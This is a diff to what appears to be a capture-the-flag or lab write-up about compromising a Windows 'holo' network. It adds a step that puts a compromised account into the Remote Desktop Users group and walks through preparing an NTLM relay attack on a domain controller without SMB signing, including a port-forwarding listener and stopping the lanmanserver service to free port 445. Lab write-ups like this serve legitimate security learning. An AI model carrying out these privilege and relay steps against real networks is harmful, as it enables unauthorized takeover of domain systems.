@@ -1711,7 +1711,13 @@ Verify if we can get a cmd as administrator:
     Enter the password for support.it:
     Attempting to start cmd.exe as user "PC-FILESRV01\support.it" ...
 
-A new administrator cmd window should appear. The next target is the domain controller. As we know we have to set up an NTML relay attack. The main problem here is that our attacker machine is not directed connected to the holo network, so we need to forward the traffic to us. The others requiremnts are satisfied since:
+A new administrator cmd window should appear. I added the created user to the remote desktop group:
+
+    net localgroup "Remote Desktop Users" support.it /add
+
+And I logged in with this user.
+
+The next target is the domain controller. As we know we have to set up an NTML relay attack. The main problem here is that our attacker machine is not directed connected to the holo network, so we need to forward the traffic to us. The others requiremnts are satisfied since:
 - We have compromised with administrator privileges: PC-FILESRV01
 - THe target host has not SMB strict sign enabled: DC-SRV01
 
@@ -1720,7 +1726,6 @@ The other server (S-SRV02) inside the network cannot be use as target since SMB 
     listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
 
 Now we need to perform an invasive action, since we are going to stop lanmanserver service (and related services) and reboot the system in order to free port 445:
-
    
     sc stop lanmanserver
 
@@ -1736,8 +1741,7 @@ So there is a dependency active for the service. Using powershell we can find wh
     ------   ----               -----------
     Running  Netlogon           Netlogon
 
-This is another problem, we cannot disable the netlogon since we won't be able to connect to the server using RDP. Netlogon authenticates users and other services within a domain.
--------------------------------------- TODO ---------------------------------------------------------
+This is an issue, we cannot disable the netlogon since we won't be able to connect to the server using RDP, indeed Netlogon authenticates users and other services within a domain. 
 
 Then reboot:
 
